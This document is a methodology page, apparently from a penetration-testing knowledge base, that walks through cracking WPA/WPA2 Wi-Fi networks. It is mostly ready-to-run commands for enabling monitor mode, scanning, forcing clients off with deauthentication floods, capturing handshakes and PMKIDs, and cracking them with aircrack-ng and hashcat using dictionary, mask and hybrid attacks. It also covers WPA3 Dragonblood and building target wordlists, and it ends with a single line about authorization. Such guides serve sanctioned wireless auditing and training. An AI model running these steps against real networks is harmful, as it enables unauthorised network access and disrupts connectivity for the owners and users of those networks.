---
title: WPA/WPA2/WPA3 Cracking
category: methodology
tags:
  - wireless
  - wpa
  - wpa2
  - wpa3
  - cracking
  - hashcat
  - aircrack-ng
  - pmkid
last_updated: 2025-12-28
---

# WPA/WPA2/WPA3 Cracking

Comprehensive guide to attacking WPA-protected wireless networks, including handshake capture, PMKID extraction, and password cracking techniques.

## Table of Contents

- [Overview](#overview)
- [Monitor Mode Setup](#monitor-mode-setup)
- [Network Discovery](#network-discovery)
- [Capturing WPA Handshakes](#capturing-wpa-handshakes)
- [PMKID Attack](#pmkid-attack)
- [Cracking with Aircrack-ng](#cracking-with-aircrack-ng)
- [Cracking with Hashcat](#cracking-with-hashcat)
- [WPA3 Considerations](#wpa3-considerations)
- [Wordlist Recommendations](#wordlist-recommendations)
- [Troubleshooting](#troubleshooting)

## Overview

WPA/WPA2 cracking primarily relies on capturing authentication material and performing offline dictionary or brute-force attacks. The two main approaches are:

| Method | Description | Client Required |
|--------|-------------|-----------------|
| 4-Way Handshake | Capture EAPOL exchange during authentication | Yes |
| PMKID Attack | Extract PMKID from AP beacon frames | No |

### Attack Prerequisites

- Wireless adapter with monitor mode and packet injection
- Target network within range
- Wordlist containing potential passwords
- Sufficient computational power for cracking

## Monitor Mode Setup

### Using airmon-ng

```bash
# Check for interfering processes
airmon-ng check

# Kill interfering processes
airmon-ng check kill

# Start monitor mode on interface
airmon-ng start wlan0

# Verify monitor mode is active
iwconfig wlan0mon
```

### Manual Monitor Mode

```bash
# Disable interface
ip link set wlan0 down

# Set monitor mode
iw dev wlan0 set type monitor

# Enable interface
ip link set wlan0 up

# Set specific channel (optional)
iw dev wlan0 set channel 6
```

### Verify Injection Capability

```bash
# Test packet injection
aireplay-ng -9 wlan0mon

# Test injection against specific AP
aireplay-ng -9 -e "TargetSSID" -a <BSSID> wlan0mon
```

## Network Discovery

### Scanning All Networks

```bash
# Basic scan
airodump-ng wlan0mon

# Scan specific band
airodump-ng --band a wlan0mon     # 5GHz
airodump-ng --band bg wlan0mon    # 2.4GHz
airodump-ng --band abg wlan0mon   # All bands

# Output to file
airodump-ng -w scan_results --output-format csv,pcap wlan0mon
```

### Understanding airodump-ng Output

```
BSSID              PWR  Beacons  #Data  #/s  CH  MB   ENC  CIPHER AUTH  ESSID
AA:BB:CC:DD:EE:FF  -45  234      156    12   6   54e  WPA2 CCMP   PSK   TargetNetwork
```

| Field | Description |
|-------|-------------|
| BSSID | Access point MAC address |
| PWR | Signal strength (closer to 0 = stronger) |
| Beacons | Number of beacon frames received |
| #Data | Number of data frames captured |
| CH | Channel |
| ENC | Encryption type (WEP, WPA, WPA2) |
| CIPHER | Cipher suite (CCMP, TKIP) |
| AUTH | Authentication method (PSK, MGT) |
| ESSID | Network name |

### Target Specific Network

```bash
# Focus on specific AP and channel
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

## Capturing WPA Handshakes

### Passive Capture

Wait for a client to connect naturally:

```bash
# Monitor target network and wait for handshake
airodump-ng -c <channel> --bssid <BSSID> -w handshake wlan0mon
```

A successful capture displays: `WPA handshake: AA:BB:CC:DD:EE:FF`

### Active Capture with Deauthentication

Force client reconnection to capture handshake:

```bash
# Deauth specific client (targeted)
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# Deauth all clients (broadcast)
aireplay-ng -0 5 -a <BSSID> wlan0mon

# Continuous deauth (use sparingly)
aireplay-ng -0 0 -a <BSSID> wlan0mon
```

### Verify Handshake Capture

```bash
# Check capture file for valid handshake
aircrack-ng handshake-01.cap

# Using cowpatty
cowpatty -r handshake-01.cap -c

# Using Wireshark filter
eapol
```

### Required EAPOL Frames

A complete 4-way handshake requires:

| Message | Direction | Contains |
|---------|-----------|----------|
| M1 | AP -> Client | ANonce |
| M2 | Client -> AP | SNonce, MIC |
| M3 | AP -> Client | GTK, MIC |
| M4 | Client -> AP | ACK |

Minimum for cracking: Messages 1 & 2 or Messages 2 & 3

## PMKID Attack

The PMKID attack extracts the PMKID from the first EAPOL frame, requiring no client connection.

### Using hcxdumptool

```bash
# Capture PMKID (modern method)
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1

# Target specific network
hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=targets.txt --filtermode=2
```

### Using hcxpcapngtool

```bash
# Convert capture to hashcat format
hcxpcapngtool -o hash.22000 capture.pcapng

# Extract only PMKID hashes
hcxpcapngtool -o pmkid.22000 --pmkid-only capture.pcapng
```

### Legacy Method with hashcat-utils

```bash
# Extract PMKID from cap file
hcxpcaptool -z pmkid.16800 capture.cap
```

## Cracking with Aircrack-ng

### Basic Dictionary Attack

```bash
# Crack using wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt handshake-01.cap

# Specify target network
aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF handshake-01.cap

# Use multiple wordlists
aircrack-ng -w list1.txt,list2.txt,list3.txt handshake-01.cap
```

### Using airolib-ng for Speed

Pre-compute PMK database for faster cracking:

```bash
# Create database
airolib-ng pmk_db --init

# Import ESSID
echo "TargetNetwork" | airolib-ng pmk_db --import essid -

# Import wordlist
airolib-ng pmk_db --import passwd /usr/share/wordlists/rockyou.txt

# Generate PMKs
airolib-ng pmk_db --batch

# Crack using database
aircrack-ng -r pmk_db handshake-01.cap
```

## Cracking with Hashcat

Hashcat provides GPU-accelerated cracking for significantly faster results.

### Convert Capture Format

```bash
# Modern format (recommended)
hcxpcapngtool -o hash.22000 capture.pcapng

# From cap file
hcxpcapngtool -o hash.22000 capture.cap

# Legacy conversion
cap2hccapx capture.cap hash.hccapx
```

### Hash Modes

| Mode | Type | Description |
|------|------|-------------|
| 22000 | WPA-PBKDF2-PMKID+EAPOL | Modern unified format |
| 22001 | WPA-PMK-PMKID+EAPOL | Pre-computed PMK |
| 16800 | WPA-PMKID-PBKDF2 | Legacy PMKID only |
| 2500 | WPA-EAPOL-PBKDF2 | Legacy handshake only |

### Dictionary Attack

```bash
# Basic dictionary attack
hashcat -m 22000 hash.22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 hash.22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Multiple wordlists with rules
hashcat -m 22000 hash.22000 wordlist1.txt wordlist2.txt -r rules/OneRuleToRuleThemAll.rule
```

### Mask Attack (Brute Force)

```bash
# 8 character lowercase
hashcat -m 22000 hash.22000 -a 3 ?l?l?l?l?l?l?l?l

# 8-10 digit numbers
hashcat -m 22000 hash.22000 -a 3 --increment --increment-min=8 ?d?d?d?d?d?d?d?d?d?d

# Custom charset (lowercase + digits)
hashcat -m 22000 hash.22000 -a 3 -1 ?l?d ?1?1?1?1?1?1?1?1
```

### Hashcat Charsets

| Charset | Description |
|---------|-------------|
| ?l | Lowercase (a-z) |
| ?u | Uppercase (A-Z) |
| ?d | Digits (0-9) |
| ?s | Special characters |
| ?a | All printable ASCII |
| ?b | All bytes (0x00-0xff) |

### Combination Attacks

```bash
# Combine two wordlists
hashcat -m 22000 hash.22000 -a 1 wordlist1.txt wordlist2.txt

# Hybrid: wordlist + mask
hashcat -m 22000 hash.22000 -a 6 wordlist.txt ?d?d?d?d

# Hybrid: mask + wordlist
hashcat -m 22000 hash.22000 -a 7 ?d?d?d?d wordlist.txt
```

### Performance Options

```bash
# Optimize for speed
hashcat -m 22000 hash.22000 wordlist.txt -O -w 3

# Specify devices
hashcat -m 22000 hash.22000 wordlist.txt -d 1,2

# Session management
hashcat -m 22000 hash.22000 wordlist.txt --session=wpa_crack
hashcat --restore --session=wpa_crack
```

## WPA3 Considerations

WPA3 uses SAE (Simultaneous Authentication of Equals), making traditional handshake attacks ineffective.

### WPA3 Security Features

| Feature | Description |
|---------|-------------|
| SAE | Dragonfly key exchange, resistant to offline attacks |
| PMF | Protected Management Frames (mandatory) |
| Forward Secrecy | Compromised password doesn't expose past traffic |

### Dragonblood Vulnerabilities

Discovered vulnerabilities in WPA3 implementations:

```bash
# Timing-based side-channel attack (requires specific conditions)
# Most implementations have been patched

# Downgrade attacks may force WPA2 mode
# Check for transition mode networks
```

### WPA3 Testing Tools

```bash
# Dragonslayer - WPA3 testing
# https://github.com/vanhoefm/dragonslayer

# Dragonforce - Dictionary attack on SAE
# Requires vulnerable implementation
```

## Wordlist Recommendations

### Common Wordlists

| Wordlist | Size | Description |
|----------|------|-------------|
| rockyou.txt | 14M | Classic leaked passwords |
| SecLists | Varies | Curated security testing lists |
| CrackStation | 15GB | Comprehensive password list |
| Weakpass | Varies | Multiple categorized lists |

### Targeted Wordlist Generation

```bash
# Generate based on keywords
crunch 8 12 -t @@@@2024 -o custom.txt

# Using CeWL for website words
cewl -d 3 -m 6 https://target.com -w site_words.txt

# Combine and mutate
hashcat --stdout wordlist.txt -r best64.rule > mutated.txt
```

### Common WiFi Password Patterns

- Phone numbers: `?d?d?d?d?d?d?d?d?d?d`
- Name + numbers: `wordlist + ?d?d?d?d`
- Company name + year: `company2024`
- Street addresses: Location-based words

## Troubleshooting

### Common Issues

| Issue | Solution |
|-------|----------|
| No handshake captured | Increase deauth, verify client presence |
| Injection not working | Check adapter compatibility, try different channel |
| Hashcat errors | Verify hash format, check driver version |
| Slow cracking speed | Use GPU, optimize settings, consider cloud cracking |

### Verification Commands

```bash
# Verify monitor mode
iwconfig wlan0mon | grep Mode

# Check for handshake in capture
tshark -r capture.cap -Y "eapol" | wc -l

# Validate hash file
hashcat -m 22000 hash.22000 --show
```

### Performance Benchmarks

```bash
# Benchmark hashcat performance
hashcat -b -m 22000

# Expected speeds (approximate):
# CPU: 10-100 kH/s
# GPU (GTX 1080): 400-500 kH/s
# GPU (RTX 3090): 1-1.2 MH/s
```

---

*Always ensure proper authorization before testing wireless networks.*
